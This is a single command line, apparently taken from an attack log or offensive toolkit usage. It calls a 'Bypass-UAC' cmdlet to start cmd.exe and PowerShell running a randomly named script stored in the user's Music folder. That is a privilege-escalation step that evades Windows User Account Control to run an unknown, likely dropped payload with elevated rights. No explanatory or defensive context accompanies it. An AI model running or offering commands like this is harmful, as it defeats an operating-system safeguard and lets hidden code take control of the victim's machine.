Bypass-UAC -command "cmd.exe /k powershell.exe c:/users/%username%/music/ktercknz.ps1"
